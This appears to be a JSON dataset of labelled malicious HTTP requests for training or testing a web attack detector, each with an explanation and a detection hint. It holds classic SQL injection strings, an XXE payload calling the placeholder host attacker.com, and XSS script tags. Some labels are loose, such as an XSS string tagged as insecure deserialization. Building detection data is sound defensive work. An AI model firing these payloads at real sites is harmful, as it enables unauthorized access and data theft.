[
    {
        "method": "GET",
        "url": "/search?q=' OR '1'='1",
        "headers": {
            "User-Agent": "Mozilla/5.0",
            "Accept": "application/json"
        },
        "body": "",
        "vulnerability": "SQL Injection",
        "explanation": "This query attempts to manipulate the SQL statement by injecting a condition that always evaluates to true, potentially allowing unauthorized access to database records.",
        "mitigate": "Identify unusual query patterns, especially those containing logical operators like 'OR' or 'AND' in unexpected contexts."
    },
    {
        "method": "POST",
        "url": "/login",
        "headers": {
            "Content-Type": "application/x-www-form-urlencoded"
        },
        "body": "username=admin&password=' OR '1'='1",
        "vulnerability": "SQL Injection",
        "explanation": "This login attempt includes an injection that bypasses authentication checks, allowing an attacker to log in as the admin without a valid password.",
        "mitigate": "Look for login requests with unusual password formats or logical operators, indicating potential injection attempts."
    },
    {
        "method": "POST",
        "url": "/api/auth",
        "headers": {
            "Content-Type": "application/json",
            "Authorization": "Bearer invalid_token"
        },
        "body": "{}",
        "vulnerability": "Broken Authentication",
        "explanation": "The use of an invalid authentication token suggests an attempt to exploit weak authentication mechanisms, potentially gaining unauthorized access.",
        "mitigate": "Monitor for authentication requests using malformed or expired tokens that deviate from normal patterns."
    },
    {
        "method": "POST",
        "url": "/register",
        "headers": {
            "Content-Type": "application/json"
        },
        "body": "{\"username\":\"user\", \"password\":\"12345\"}",
        "vulnerability": "Sensitive Data Exposure",
        "explanation": "This request may expose sensitive information (password) in plaintext if transmitted over an insecure connection, making it susceptible to interception.",
        "mitigate": "Check for registration requests that include plaintext passwords or sensitive information being sent without encryption."
    },
    {
        "method": "POST",
        "url": "/upload",
        "headers": {
            "Content-Type": "multipart/form-data"
        },
        "body": "file=<xml><!DOCTYPE foo [<!ENTITY xxe SYSTEM 'http://attacker.com/malicious'>]><foo>&xxe;</foo></xml>",
        "vulnerability": "XML External Entities (XXE)",
        "explanation": "This payload exploits XML parsers by including a reference to an external entity, which can lead to data exfiltration or denial of service.",
        "mitigate": "Look for XML uploads containing DOCTYPE declarations or external entity references that are not typical for the application."
    },
    {
        "method": "GET",
        "url": "/admin",
        "headers": {
            "Cookie": "session=12345; admin=true"
        },
        "body": "",
        "vulnerability": "Broken Access Control",
        "explanation": "This request attempts to access an admin endpoint without proper authorization, indicating a potential privilege escalation attack.",
        "mitigate": "Identify requests targeting administrative endpoints without valid authorization headers or with suspicious cookie values."
    },
    {
        "method": "POST",
        "url": "/comments",
        "headers": {
            "Content-Type": "application/x-www-form-urlencoded"
        },
        "body": "comment=<script>alert('XSS')</script>",
        "vulnerability": "Cross-Site Scripting (XSS)",
        "explanation": "This input attempts to inject a script into the application, which could be executed in a user's browser, leading to data theft or session hijacking.",
        "mitigate": "Detect comments containing HTML tags or JavaScript code, especially those with <script> elements, which are not typical for user input."
    },
    {
        "method": "POST",
        "url": "/api/data",
        "headers": {
            "Content-Type": "application/json"
        },
        "body": "{\"data\":\"<object><script>alert('XSS')</script></object>\"}",
        "vulnerability": "Insecure Deserialization",
        "explanation": "This request contains serialized data designed to execute a script when deserialized, potentially leading to remote code execution.",
        "mitigate": "Identify requests with serialized objects containing executable scripts or unusual data types that are atypical for the application."
    },
    {
        "method": "GET",
        "url": "/api/version",
        "headers": {
            "User-Agent": "Mozilla/5.0",
            "X-Framework-Version": "v1.0.0"
        },
        "body": "",
        "vulnerability": "Using Components with Known Vulnerabilities",
        "explanation": "The presence of a known vulnerable component version in the request headers indicates a potential attack vector that could be exploited.",
        "mitigate": "Monitor for requests that expose framework or library versions, particularly those known to have vulnerabilities."
    },
    {
        "method": "GET",
        "url": "/settings",
        "headers": {
            "X-Frame-Options": "ALLOWALL"
        },
        "body": "",
        "vulnerability": "Security Misconfiguration",
        "explanation": "The absence of proper security headers like X-Frame-Options may allow clickjacking attacks, compromising user security.",
        "mitigate": "Look for missing or overly permissive security headers in requests that may indicate misconfigurations."
    }
]
